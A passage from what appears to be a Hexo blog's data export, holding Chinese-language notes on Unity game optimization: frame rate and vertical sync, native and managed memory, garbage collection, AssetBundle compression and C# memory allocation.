\n开启垂直同步,会强制将帧率与显卡写入缓冲区的速度保持一致,显卡就有了空闲时间,就限制了显卡画图的速度/帧率/写入缓冲区的速度.        \n有的游戏设置会有三重缓冲,这样就没有必要等待显示器的信号画完才开始写入缓冲区了.\n\n* 5 其他解决方式,让显示器显示画面的速度跟随显卡画图/帧率/写入缓冲区的速度.AMD,NVIDIA 都有这样的技术.\n\n* 6:如果 Unity 中的 VSyncCount设置的选项不是 Don't Sync ,这就是需要显卡跟随显示器显示的速度了,也就是开启了垂直同步.(Every V Blank,每一帧显卡都会有空闲时间)设定显卡的帧率是显示器默认的一半,比如手机默认是 60FPS,则会变成 30FPS\n\n\n\n# 阴影方案\n\n# shader 优化\n\n# 多核的利用","source":"_posts/Unity/Optimize/Unity帧率.md","raw":"---\ntitle: Unity 优化总纲\ndate: 2020-05-08 11:41:32\ntop: 20\ncategories:\n- Unity优化\ntags:\n- Unity优化\n---\n\n# 帧率\n* 1:FPS 的概念:FPS 是一段时间内的平均值。\n平均 FPS = 帧数 / 一段时长。   通常意义上是讲的 60 帧/S\n帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。\n帧率 16ms 表示渲染完这一帧花费了 16ms\n\n\n* 2 显示器和显卡的概念: 显示器和显卡是 2 个概念,显卡写入帧缓冲区的速度不等于显示器显示画面(扫描枪扫描一次)的速度,大部分显示器是 60HZ,也就是每秒钟显示 60 幅画面.\n\n* 3 问题:显卡写入缓冲区的速度(画图的速度)超过了显示器每秒钟显示画面的速度!!帧率概念:显卡的 FPS/帧率是显卡画图的速度,假设显卡每秒可以画 90 幅画面,显示器每秒只能展示 60 幅画面,也就是当显示器正在显示第 A 帧的画面,显卡将A帧这个缓冲区覆盖成一半的 A 帧 + B 帧的数据,就造成了显示器显示画面的撕裂.垂直同步就是为了解决这个问题存在的.\n\n* 4 垂直同步,显卡的画图速度会被限制成显示器显示画面的速度,显卡写入缓冲区的操作会等待显示器的信号,等显示器将每一幅画面都显示完整了,才会显示下一副画面.       \n当显卡写入缓冲区的速度/帧率与垂直同步的速度一致,则不会造成画面撕裂,否则就会产生画面撕裂的感觉.      \n开启垂直同步,会强制将帧率与显卡写入缓冲区的速度保持一致,显卡就有了空闲时间,就限制了显卡画图的速度/帧率/写入缓冲区的速度.        \n有的游戏设置会有三重缓冲,这样就没有必要等待显示器的信号画完才开始写入缓冲区了.\n\n* 5 其他解决方式,让显示器显示画面的速度跟随显卡画图/帧率/写入缓冲区的速度.AMD,NVIDIA 都有这样的技术.\n\n* 6:如果 Unity 中的 VSyncCount设置的选项不是 Don't Sync ,这就是需要显卡跟随显示器显示的速度了,也就是开启了垂直同步.(Every V Blank,每一帧显卡都会有空闲时间)设定显卡的帧率是显示器默认的一半,比如手机默认是 60FPS,则会变成 30FPS\n\n\n\n# 阴影方案\n\n# shader 优化\n\n# 多核的利用","slug":"Unity/Optimize/Unity帧率","published":1,"updated":"2020-06-30T07:16:11.750Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0a003m2gk7fm4ihcra","content":"<h1 id=\"帧率\"><a href=\"#帧率\" class=\"headerlink\" title=\"帧率\"></a>帧率</h1><ul>\n<li>1:FPS 的概念:FPS 是一段时间内的平均值。<br>平均 FPS = 帧数 / 一段时长。   通常意义上是讲的 60 帧/S<br>帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。<br>帧率 16ms 表示渲染完这一帧花费了 16ms</li>\n</ul>\n<ul>\n<li><p>2 显示器和显卡的概念: 显示器和显卡是 2 个概念,显卡写入帧缓冲区的速度不等于显示器显示画面(扫描枪扫描一次)的速度,大部分显示器是 60HZ,也就是每秒钟显示 60 幅画面.</p>\n</li>\n<li><p>3 问题:显卡写入缓冲区的速度(画图的速度)超过了显示器每秒钟显示画面的速度!!帧率概念:显卡的 FPS/帧率是显卡画图的速度,假设显卡每秒可以画 90 幅画面,显示器每秒只能展示 60 幅画面,也就是当显示器正在显示第 A 帧的画面,显卡将A帧这个缓冲区覆盖成一半的 A 帧 + B 帧的数据,就造成了显示器显示画面的撕裂.垂直同步就是为了解决这个问题存在的.</p>\n</li>\n<li><p>4 垂直同步,显卡的画图速度会被限制成显示器显示画面的速度,显卡写入缓冲区的操作会等待显示器的信号,等显示器将每一幅画面都显示完整了,才会显示下一副画面.<br>当显卡写入缓冲区的速度/帧率与垂直同步的速度一致,则不会造成画面撕裂,否则就会产生画面撕裂的感觉.<br>开启垂直同步,会强制将帧率与显卡写入缓冲区的速度保持一致,显卡就有了空闲时间,就限制了显卡画图的速度/帧率/写入缓冲区的速度.<br>有的游戏设置会有三重缓冲,这样就没有必要等待显示器的信号画完才开始写入缓冲区了.</p>\n</li>\n<li><p>5 其他解决方式,让显示器显示画面的速度跟随显卡画图/帧率/写入缓冲区的速度.AMD,NVIDIA 都有这样的技术.</p>\n</li>\n<li><p>6:如果 Unity 中的 VSyncCount设置的选项不是 Don’t Sync ,这就是需要显卡跟随显示器显示的速度了,也就是开启了垂直同步.(Every V Blank,每一帧显卡都会有空闲时间)设定显卡的帧率是显示器默认的一半,比如手机默认是 60FPS,则会变成 30FPS</p>\n</li>\n</ul>\n<h1 id=\"阴影方案\"><a href=\"#阴影方案\" class=\"headerlink\" title=\"阴影方案\"></a>阴影方案</h1><h1 id=\"shader-优化\"><a href=\"#shader-优化\" class=\"headerlink\" title=\"shader 优化\"></a>shader 优化</h1><h1 id=\"多核的利用\"><a href=\"#多核的利用\" class=\"headerlink\" title=\"多核的利用\"></a>多核的利用</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"帧率\"><a href=\"#帧率\" class=\"headerlink\" title=\"帧率\"></a>帧率</h1><ul>\n<li>1:FPS 的概念:FPS 是一段时间内的平均值。<br>平均 FPS = 帧数 / 一段时长。   通常意义上是讲的 60 帧/S<br>帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。<br>帧率 16ms 表示渲染完这一帧花费了 16ms</li>\n</ul>\n<ul>\n<li><p>2 显示器和显卡的概念: 显示器和显卡是 2 个概念,显卡写入帧缓冲区的速度不等于显示器显示画面(扫描枪扫描一次)的速度,大部分显示器是 60HZ,也就是每秒钟显示 60 幅画面.</p>\n</li>\n<li><p>3 问题:显卡写入缓冲区的速度(画图的速度)超过了显示器每秒钟显示画面的速度!!帧率概念:显卡的 FPS/帧率是显卡画图的速度,假设显卡每秒可以画 90 幅画面,显示器每秒只能展示 60 幅画面,也就是当显示器正在显示第 A 帧的画面,显卡将A帧这个缓冲区覆盖成一半的 A 帧 + B 帧的数据,就造成了显示器显示画面的撕裂.垂直同步就是为了解决这个问题存在的.</p>\n</li>\n<li><p>4 垂直同步,显卡的画图速度会被限制成显示器显示画面的速度,显卡写入缓冲区的操作会等待显示器的信号,等显示器将每一幅画面都显示完整了,才会显示下一副画面.<br>当显卡写入缓冲区的速度/帧率与垂直同步的速度一致,则不会造成画面撕裂,否则就会产生画面撕裂的感觉.<br>开启垂直同步,会强制将帧率与显卡写入缓冲区的速度保持一致,显卡就有了空闲时间,就限制了显卡画图的速度/帧率/写入缓冲区的速度.<br>有的游戏设置会有三重缓冲,这样就没有必要等待显示器的信号画完才开始写入缓冲区了.</p>\n</li>\n<li><p>5 其他解决方式,让显示器显示画面的速度跟随显卡画图/帧率/写入缓冲区的速度.AMD,NVIDIA 都有这样的技术.</p>\n</li>\n<li><p>6:如果 Unity 中的 VSyncCount设置的选项不是 Don’t Sync ,这就是需要显卡跟随显示器显示的速度了,也就是开启了垂直同步.(Every V Blank,每一帧显卡都会有空闲时间)设定显卡的帧率是显示器默认的一半,比如手机默认是 60FPS,则会变成 30FPS</p>\n</li>\n</ul>\n<h1 id=\"阴影方案\"><a href=\"#阴影方案\" class=\"headerlink\" title=\"阴影方案\"></a>阴影方案</h1><h1 id=\"shader-优化\"><a href=\"#shader-优化\" class=\"headerlink\" title=\"shader 优化\"></a>shader 优化</h1><h1 id=\"多核的利用\"><a href=\"#多核的利用\" class=\"headerlink\" title=\"多核的利用\"></a>多核的利用</h1>"},{"title":"Unity 内存优化","date":"2020-05-08T03:41:32.000Z","top":10,"_content":"\n\n\n# 参考资料\nhttps://docs.unity.cn/cn/current/Manual/BestPracticeGuides.html\nhttps://www.bilibili.com/video/BV1aJ411t7N6\nhttps://zhuanlan.zhihu.com/p/61105374\n\n# GC\n* 1:[GC优化](https://mp.weixin.qq.com/s/ARNJtujrHKgxBWuanO0tpA)\n\n# 内存分类\nUnity 3D中的内存管理 http://onevcat.com/2012/11/memory-in-unity3d/\n\n# 资源内存\nhttps://www.cnblogs.com/88999660/archive/2013/03/15/2961663.html\n\n\n# 概念理解\n\n#### 内存\n* 物理内存:CPU 访问内存是一个慢速过程,减少Cache Miss,ECS 和 DOTS\n* 虚拟内存:内存交换,移动设备不支持内存交换,iOS 可以进行内存压缩,Android 没有内存压缩能力\n* 内存杀手 low memory killer(AKA lmk),内存不足时，killer 会出现，从上图底层一层一层地向上杀。（Cached-Previous-Home...）\n![内存杀手](内存杀手.png)\n\n#### Unity 内存管理\n\n- Unity 是一个 C++ 引擎\n    - 底层代码完全由 C++ 写成\n    - 通过 Wrapper 提供给用户 API ; .binding 链接 C#与 C++的语言,目前逐渐转成 C#\n    - 用户代码会转换为 CPP 代码 （il2cpp）\n        - VM 仍然存在（il2cpp vm）,主要是为了跨平台\n    - Editor ,package,都是用 C#写的\n- Unity 内存按照分配方式分为：\n    - Native Memory\n    - Managed Memory\n    - Editor & Runtime 是完全不同的\n        - 不止是统计看到的内存大小不同，甚至是内存分配时机和方式也不同\n        - Asset 在 Runtime 中如果不读取，是不会进内存的，但 Editor 打开就占内存。因为 Editor 不注重 Runtime 的表现，更注重编辑器中编辑时的流畅。\n            - 但如果游戏庞大到几十个 G，如果第一次打开项目，会消耗很多时间，有的大的会几天，甚至到一周。\n- Unity 内存按照管理者分为：\n    - 引擎管理内存\n    - 用户管理内存（应优先考虑）\n- Unity 检测不到的内存\n    - 用户分配的 native 内存\n        - 自己写的 Native 插件（C++ 插件）， Unity 无法分析已经编译过的 C++ 是如何去分配和使用内存的。\n        - Lua 完全由自己管理内存，Unity 无法统计到内部的使用情况。\n\n#### Unity 游戏应用的4种内存类型\n* 1: Unity底层(C++层,本机堆,核心代码,unityengine.dll等一系列别称)占用的内存,包含Scene,Audio,CodeSize,贴图等.Unity使用了自己的一套内存管理机制来使这块内存具有和托管堆类似的功能。基本理念是，如果在这个关卡里需要某个资源，那么在需要时就加载，之后在没有任何引用时进行卸载。听起来很美好也和托管堆一样，但是由于Unity有一套自动加载和卸载资源的机制，让两者变得差别很大。自动加载资源可以为开发者省不少事儿，但是同时也意味着开发者失去了手动管理所有加载资源的权力，这非常容易导致大量的内存占用（贴图什么的你懂的），也是Unity给人留下“吃内存”印象的罪魁祸首。       \n\n* 2: Unity的托管堆（Managed Heap）,托管内存,也被称为用户管理的内存,[Mono](http://www.mono-project.com/Main_Page)项目一个开源的.net框架的一种实现，对于Unity开发，其实充当了基本类库的角色。托管堆用来存放类的实例（比如用new生成的列表，实例中的各种声明的变量等）。“托管”的意思是Mono“应该”自动地改变堆的大小来适应你所需要的内存，并且定时地使用垃圾回收（Garbage Collect）来释放已经不需要的内存。关键在于，有时候你会忘记清除对已经不需要再使用的内存的引用，从而导致Mono认为这块内存一直有用，而无法回收。profile可以检测到.并且需要手机查找才正常,经常需要优化的部分.\n\n* 3: 代码文件的内存.如lua脚本本身的内存.C#泛型类的内存,C++层会将泛型编译成静态类型就多出很多文件,尽量注意不要使用太多泛型模板类,shader写的一个,但是编译成很多份的文件等,都是代码文件会占用的内存.\n程序代码包括了所有的Unity引擎，使用的库，以及你所写的所有的游戏代码。在编译后，得到的运行文件将会被加载到设备中执行，并占用一定内存。这部分内存实际上是没有办法去“管理”的，它们将在内存中从一开始到最后一直存在。一个空的Unity默认场景，什么代码都不放，在iOS设备上占用内存应该在17MB左右，而加上一些自己的代码很容易就飙到20MB左右。想要减少这部分内存的使用，能做的就是减少使用的库。 \n\n* 4: 第三方库的占用的内存,也被称为用户管理的内存,但是已经和unity的内存关系上完全无关了,如自己使用C++编译的库,tolua占用的内存,lua文件占用的内存(这个不是unity管理的),lua占用的内存. 并且unity编辑器的profile无法检测到.\n\n# Unity Native Memory 管理以及优化\n- Unity 重载了所有分配内存的操作符（C++ alloc、new），使用这些重载的时候，会需要一个额外的 memory label （Profiler-shaderlab-object-memory-detail-snapshot，里面的名字就是 label：指当前内存要分配到哪一个类型池里面）\n- 使用重载过的分配符去分配内存时，Allocator 会根据你的 memory label 分配到不同 Allocator 池里面，每个 Allocator 池 单独做自己的跟踪。因此当我们去 Runtime get memory label 下面的池时就可以问 Allocator，里面有多少东西 多少兆。\n- Allocator 在 NewAsRoot 中生成,生成了一个 memory island(root)。在这个 memory island(root) 下面会有很多子内存：shader：当我们加载一个 Shader 进内存的时候，会生成一个 Shader 的 root。Shader 底下有很多数据：sub shader、Pass 等会作为 memory (root) 的成员去依次分配。因此当我们最后统计 Runtime 的时候，我们会统计 Root，而不会统计成员，因为太多了没法统计。\n- 因为是 C++ 的，因此当我们 delete、free 一个内存的时候会立刻返回内存给系统，与托管内存堆不一样。\n\n- Scene\n    - Unity 是一个 C++ 引擎，所有实体最终都会反映在 C++ 上，而不是托管堆里面。因此当我们实例化一个 GameObject 的时候，在 Unity 底层会构建一个或多个 Object 来存储这个 GameObject 的信息，例如很多 Components。因此当 Scene 有过多 GameObject 的时候，Native 内存就会显著上升。\n    - 当我们看 Profiler，发现 Native 内存大量上升的时候，应先去检查 Scene。\n- Audio\n    - DSP buffer （声音的缓冲）\n        - 当一个声音要播放的时候，它需要向 CPU 去发送指令——我要播放声音。但如果声音的数据量非常小，就会造成频繁地向 CPU 发送指令，会造成 I\\O。\n        - 当 Unity 用到 FMOD 声音引擎时（Unity 底层也用到 FMOD），会有一个 Buffer，当 Buffer 填充满了，才会向 CPU 发送 \"我要播放声音\" 的指令。\n        - DSP buffer 会导致两种问题：\n            - 如果（设置的） buffer 过大，会导致声音的延迟。要填充满 buffer 是要很多声音数据的，但声音数据又没这么大，因此会导致一定的**声音延迟**。\n            - 如果 DSP buffer 太小，会导致 CPU 负担上升，满了就发，消耗增加。\n\n            [Audio](https://docs.unity3d.com/Manual/class-AudioManager.html)\n\n    - Force to mono\n        - 在导入声音的时候有一个设置，很多音效师为了声音质量，会把声音设为双声道。但 95% 的声音，左右声道放的是完全一样的数据。这导致了 1M 的声音会变成 2M，体现在包体里和内存里。因此一般对于声音不是很敏感的游戏，会建议改成 Force to mono，强制单声道。\n    - Format\n    - Compression Format（看文档，有使用建议）\n- Code Size\n    - C++ 模板泛型的滥用,会影响到 Code Size、打包的速度。会翻译成 CPP 文件,如果泛型过多,则会造成 CPP 过大,每一个泛型都会生成一个对应的 class,都会变成静态类型.\n        - 可以参考 [Memory Management in Unity](https://learn.unity.com/tutorial/memory-management-in-unity) 3.IL2CPP & Mono 的 Generic Sharing 部分。\n- AssetBundle\n    - TypeTree\n        - Unity 的每一种类型都有很多数据结构的改变，为了对此做兼容，Unity 会在生成数据类型序列化的时候，顺便会生成 TypeTree：当前我这一个版本里用到了哪些变量，对应的数据类型是什么。在反序列化的时候，会根据 TypeTree 来进行反序列化。\n            - 如果上一个版本的类型在这个版本中没有，TypeTree 就没有它，因此不会碰到它。\n            - 如果要用一个新的类型，但在这个版本中不存在，会用一个默认值来序列化，从而保证了不会在不同的版本序列化中出错，这个就是 TypeTree 的作用。\n        - Build AssetBundle 中有开关可以关掉 TypeTree。当你确认当前 AssetBundle 的使用和 Build Unity 的版本一模一样，这时候可以把 TypeTree 关掉。\n            - 例如如果用同样的 Unity 打出来的 AssetBundle 和 APP，TypeTree 则完全可以关掉。\n        - TypeTree 好处：\n            - 内存减少。TypeTree 本身是数据，也要占内存。\n            - 包大小会减少，因为 TypeTree 会序列化到 AssetBundle 包中，以便读取。\n            - Build 和运行时会变快。源代码中可以看到，因为每一次 Serialize 东西的时候，如果发现需要 Serialize TypeTree，则会 Serialize 两次：\n                - 第一次先把 TypeTree Serialize 出来\n                - 第二次把实际的东西 Serialize 出来\n                - 反序列化也会做同样的事情，1. TypeTree 反序列化，2. 实际的东西反序列化。\n            - 因此如果确定 TypeTree 不会对兼容性造成影响，可以把它关掉。这样对 Size 大小和 Build Runtime 都会获得收益。\n\n    - 压缩方式：\n        - Lz4\n\n            [BuildCompression.LZ4](https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZ4.html)\n\n            - LZ4HC \"Chunk Based\" Compression. 非常快\n            - 和 Lzma 相比，平均压缩比率差 30%。也就是说会导致包体大一点，但是（作者说）速度能快 10 倍以上。\n        - Lzma\n\n            [BuildCompression.LZMA](https://docs.unity3d.com/2019.3/Documentation/ScriptReference/BuildCompression.LZMA.html)\n\n            - Lzma 基本上就不要用了，因为解压和读取速度上都会比较慢。\n            - 还会占大量内存\n                - 因为是 Steam based 而不是 Chunk Based 的，因此需要一次全解压\n                - Chunk Based 可以一块一块解压\n                    - 如果发现一个文件在第 5-10 块，那么 LZ4 会依次将 第 5 6 7 8 9 10 块分别解压出来，每次（chunk 的）解压会重用之前的内存，来减少内存的峰值。\n        - 预告：中国版 Unity 会在下个版本（1月5号或2月份）推出新的功能：基于 LZ4 的 AssetBundle 加密，只支持 LZ4。\n        - Size & count\n            - AssetBundle 包打多大是很玄学的问题，但每一个 Asset 打一个 Bundle 这样不太好。\n                - 有一种减图片大小的方式，把 png 的头都提出来。因为头的色板是通用的，而数据不通用。AssetBundle 也一样，一部分是它的头，一部分是实际打包的部分。因此如果每个 Asset 都打 Bundle 会导致 AssetBundle 的头比数据还要大。\n            - 官方的建议是每个 AssetBundle 包大概 1M~2M 左右大小，考虑的是网络带宽。但现在 5G 的时候，可以考虑适当把包体加大。还是要看实际用户的情况。\n\n- Resource 文件夹（**Do not use it**. 除非在 debug 的时候）\n    - Resource 和 AssetBundle 一样，也有头来索引。Resource  在打进包的时候会做一个红黑树，来帮助 Resource 来检索资源在什么位置，\n    - 如果 Resource 非常大，那么红黑树也会非常大。\n    - 红黑树是不可卸载的。在刚开始游戏的时候就会加载进内存中，会持续对游戏造成内存压力。\n    - 会极大拖慢游戏的启动时间。因为红黑树没加载完，游戏不能启动。\n\n- Texture\n    - upload buffer，和声音的很像：填满多大，就向 CPU push 一次。\n    - r/w\n        - Texture 没必要就不要开 read and write。正常 Texture 读进内存，解析完了，放到 upload buffer 里后，内存里的就会 delete 掉。\n        - 但如果检测到你开了 r/w 就不会 delete 了，就会在显存和内存中各一份。\n    - Mip Maps\n        - UI 没必要开，可以省大量内存。\n    - Mesh\n        - r/w\n        - compression\n            - 有些版本 Compression 开了不如不开，内存占用可能更严重，具体需要自己试。\n    - Assets\n        - Assets 的数量实际上和 asset 整个的纹理是有关系的。（？）\n\n        [Memory Management in Unity - Unity Learn](https://learn.unity.com/tutorial/memory-management-in-unity)\n\n#### Unity Managed Memory 优化用户管理内存\n[Understanding the managed heap](https://docs.unity3d.com/Manual/BestPracticeUnderstandingPerformanceInUnity4-1.html)\n\n- VM 内存池\n    - mono 虚拟机的内存池\n    - VM 会返还内存给 OS 吗？\n        - **会**\n    - 返还条件是什么？\n        - GC 不会把内存返还给系统\n        - 内存也是以 Block 来管理的。当一个 Block 连续六次 GC 没有被访问到，这块内存才会被返还到系统。（mono runtime 基本看不到，IL2cpp runtime 可能会看到多一点）\n    - 不会频繁地分配内存，而是一次分配一大块。\n- GC 机制（BOEHM Non-generational 不分代的）\n    - GC 机制考量\n        - Throughput(（回收能力）\n            - 一次回收，会回收多少内存\n        - Pause times（暂停时长）\n            - 进行回收的时候，对主线程的影响有多大\n        - Fragmentation（碎片化）\n            - 回收内存后，会对整体回收内存池的贡献有多少\n        - Mutator overhead（额外消耗）\n            - 回收本身有 overhead，要做很多统计、标记的工作\n        - Scalability（可扩展性）\n            - 扩展到多核、多线程会不会有 bug\n        - Protability（可移植性）\n            - 不同平台是否可以使用\n    - BOEHM\n        - Non-generational（不分代的）\n\n            ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8934bc1f-3e98-4544-b6de-6ea5b80e2850/Untitled.png)\n\n            - 分代是指：大块内存、小内存、超小内存是分在不同内存区域来进行管理的。还有长久内存，当有一个内存很久没动的时候会移到长久内存区域中，从而省出内存给更频繁分配的内存。\n            - “非代数”是不分代的,指必须扫描整个托管堆，因此在执行收集传递时必须扫描整个堆，因此其性能因堆的大小扩展而降低。\n        - Non-compacting（非压缩式）\n\n            ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33a4002e-f37e-4405-b9b3-815c0f43caba/Untitled.png)\n\n            - 当有内存被回收的时候，压缩内存会把上图空的地方重新排布。是指当释放的内存产生的间隙不会消失。也就是说对象被销毁，内存被释放，这块内存不会马上收集成为空闲内存的一部分，这块内存只能用来存储比释放对象相同或更小的数据，如果内存间隔太小，会产生内存碎片.即使可能有足够的总空间来容纳某个分配，托管堆也无法找到足够大的连续内存块来适合分配。\n            - 但 Unity 的 BOEHM 不会！它是非压缩式的。空着就空着，下次要用了再填进去。\n                - 历史原因：Unity 和 Mono 合作上，Mono 并不是一直开源免费的，因此 Unity 选择不升级 Mono，与实际 Mono 版本有差距。\n                - 下一代 GC\n                    - Incremental GC（渐进式 GC）\n                        - 现在如果我们要进行一次 GC，主线程被迫要停下来，遍历所有 GC Memory “island”（没听清），来决定哪些 GC 可以回收。\n                        - Incremental GC 把暂停主线程的事分帧做了。一点一点分析，主线程不会有峰值。总体 GC 时间不变，但会改善 GC 对主线程的卡顿影响。\n                    - SGen 或者升级 Boehm？\n                        - SGen 是分代的，能避免内存碎片化问题，调动策略，速度较快\n                    - IL2CPP\n                        - 现在 IL2CPP 的 GC 机制是 Unity 自己重新写的，是升级版的 Boehm\n    - Memory fragmentation 内存碎片化\n\n        ![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/96caa361-8d1a-4f8e-a0b6-87d521bb7f14/Untitled.png)\n\n        - 为什么内存下降了，但总体内存池还是上升了？\n            - 因为内存太大了，内存池没地方放它，虽然有很多内存可用。（内存已被严重碎片化）\n        - 当开发者大量加载小内存，使用释放*N，例如配置表、巨大数组，GC 会涨一大截。\n            - 建议先操作大内存，再操作小内存，以保证内存以最大效率被重复利用。\n    - Zombie Memory（僵尸内存）\n        - 内存泄露说法是不对的，内存只是没有任何人能够管理到，但实际上内存没有被泄露，一直在内存池中，被 zombie 掉了，这种叫 Zombie 内存。\n        - 无用内容\n            - Coding 时候或者团队配合的时候有问题，加载了一个东西进来，结果从头到尾只用了一次。\n            - 有些开发者写了队列调度策略，但是策略写的不好，导致一些他觉得会被释放的东西，没有被释放掉。\n            - 找是否有活跃度实际上并不高的内存。\n        - 没有释放\n        - 通过代码管理和性能工具分析\n    - 最佳实践\n        - Don't Null it, but Destroy it（显式用 Destory，别用 Null）\n        - Class VS Struct,尽量用 Struct\n        - Pool In Pool（池中池）\n            - VM 本身有内存池，但建议开发者对高频使用的小部件，自己建一个内存池。例如子弹等,高频使用的小部件。\n        - Closures and anonymous methods（闭包和匿名函数）\n            - 如果看 IL，所有匿名函数和闭包会 new 成一个 class，因此所有变量和要 new 的东西都是要占内存的。这样会导致协程。\n                - 有些开发者会在游戏开始启用一个协程，直到游戏结束才释放，这是错误的。\n                - 只要协程不被释放掉，所有内存都会在内存里,在协程里面的内存,只要协程不被释放,则会一直在内存里面。\n                - 用的时候生产一个协程,不用的时候就释放,这是最好的使用协程的方式\n        - Coroutines（协程）\n            - 可看做闭包和匿名函数的一个特例\n            - 最佳实践：用的时候生产一个，不用的时候 destroy 掉。\n        - Configurations（配置表）\n            - 不要把整个配置表都扔进去，是否能通过啥来切分下配置表\n        - Singleton\n            - 慎用,严格检查使用.\n            - 有些内存从游戏一开始到游戏死掉，一直在内存中。\n\n# 优化重点以及方向\nunity托管内存>第三方库(主要是lua优化)>unity底层优化>代码文件.\n\n#### unity托管内存(用户管理内存)\n\n* c# 一共有几种类型:一共有四类\n> 1 值类型。在C#中，所有从System.ValueType继承的类型.bool;byte;char;decimal;double;enum;float;int;long;sbyte;short;ushort;uint;ulong;struct   \n> 2 引用类型。类、接口、委托、object对象;string;stringBuilder;class;interface;delegate        \n> 3 指针。当我们把对象放到堆内存时，访问该对象，就需要一个指向该对象的引用，也就是指针,我们不需要显式的使用指针，Clr会对引用进行管理;注意区别指针(引用)与引用类型的区别，当我们说类型是引用类型时，指的是它需要通过指针来访问;而指针存储着一个指向内存的地址。        \n> 4 指令。处理指令，比如变量声明、数学运算、跳转等\n\n对比参数|值类型\t| 引用类型|\n-------|------|---|\n内存分配(管理) |\t线程栈 |\t托管堆|\n内存回收|\t直接释放|\t等待 GC (垃圾回收器)回收|\nnew实例|\t返回值本身|\t返回内存地址，如果垃圾回收器第0代内存满时，可能引起垃圾回收|\n变量赋值|\t逐字段复制|\t赋值内存地址|\n类型特点|\t轻量、无额外字段|\t需要额外字段（类型地址指针、同步块索引）|\n常见类型|\t数值类型、枚举类型、struct类型|\tstring、clas类|\n是否支持继承|\t值类型都是密封类型，所以不支持继承|\t单继承|\n接口实现|\t支持|\t支持|\n表现方式|\t未装箱、已装箱|\t总是已装箱\n\n\n* 栈的主要功能是什么？\n> 栈的主要功能是跟踪线程执行时的代码指针的位置，以及被调用和返回的数据,可以把它看做一个线程的状态，每个线程都有自己独立的栈。\n> 当调用函数时，会将函数的参数压入线程栈，在方法内的局部变量也会压入线程栈顶。方法执行结束后， 返回值被返回。C++中也是一样的\n\n* 怎么确定数据分配到了哪个内存区？怎么确定数据分配在栈还是堆上？\n> 值类型和指针总分配在被声明的地方，即他们的分配与声明的位置有关，声明在哪儿就分配在哪儿\n> 非空引用类型对象和所有装箱值类型对象总是分配在堆内存上;严格来说，必须在托管堆上分配所有非 null 引用类型对象和所有装箱值类型对象\n> 栈内存由当前线程管理,堆内存由 GC 管理\n\n* 值类型一定分配在栈上吗？\n> 不是,如果声明在函数的局部变量，就分配到线程栈中；如果声明在一个class类中，就分配在堆内存中\n\n* 垃圾回收是如何工作的？垃圾回收的执行过程是什么样的？\n> 1.当GC开始调用时，挂起所有正在运行的线程\n> 2.检查堆上的每个对象,回收线程会检查内存堆\n> 3.搜索当前对象的所有引用\n> 4.没有被引用的对象都是垃圾，被标记为可删除\n> 5.最后遍历删除被标记为可删除的对象，释放内存\n> 6.最后GC会对剩下的对象进行重定位，同时会更新所有指向这些对象的指针（引用）。这一系列操作在性能消耗方面非常昂贵，所以在编写高性能代码时，要注意栈和堆得内存分配。\n\n* 什么情况会触发垃圾回收？\n> 代码需要在托管堆上分配内存时，但发现可分配的空间不足的情况下会触发GC\n> 手动代码调用触发GC\n> Unity不定期的触发GC\n\n* 内存碎片的现象会造成什么问题？\n> 1:堆内存是一块连续的内存地址，清理其中垃圾之后，就会造成内存碎片。\n> 2:内存间隔太小不够放新的对象\n> 3:一个托管堆虽然总空间量已经很大了，但是在这个空间里的内存间隔找不到连续空间来存储新的对象.\n> 4:如果有内存压缩的 GC 机制,内存碎片就会被清空还给系统,最新版的 Unity 会添加内存压缩的 GC 机制,目前应该在筹备中\n\n* unity什么时候会给堆内存扩容？\n> 如果unity发现托管堆的内存不够分配了，会先进行GC，如果GC之后，发现还是不够分配，就进行托管堆的扩容（扩展），堆扩展的具体数量取决于平台; 但是，大多数Unity平台的大小都是托管堆的两倍。\n> 开始分配-->检查托管堆上是否有足够的可分配内存,有就给变量分配内存;没有就触发 Unity 的 GC(垃圾回收)-->检查托管对上是否有足够的可分配内存-->有就给变量分配内存;没有,Unity 就向操作系统申请新的内存(扩充托管对的大小)-->有就给变量分配内存;没有就干掉后台的其他 APP,在没有就再干掉系统服务等等,在没有就杀掉当前 APP\n\n* 从代码上有哪些写法是可以避免内存碎片产生的？\n> 不要在频繁调用的函数中反复进行堆内存分配,在像Update()和LateUpdate()这种每帧都调用的函数，可以判断值变化了才调用某个会有堆内存分配的函数，或者计时器到了才调用某个函数\n> 清空而不是创建集合,创建新的集合(比如：数组，字典，链表等集合类数据)会导致托管堆上的内存分配 , 如果发现在代码中不止一次地创建新集合，那么我们应该缓存引用到的集合，并使用Clear()清空其内容，而不是重复调用new()\n> 尽可能避免C＃中的闭包。在性能敏感的代码中应该尽可能的减少匿名方法和方法引用的使用，尤其是在基于每帧执行的代码中。匿名方法要求该方法能够访问方法范围之外的变量状态，因此已成为闭包。于是C＃通过生成一个匿名类，可以保留闭包所需的外部范围变量。当执行闭包需要实例化其生成的类的副本，并且所有类都是C＃中的引用类型，所以执行闭包需要在托管堆上分配对象。\n> 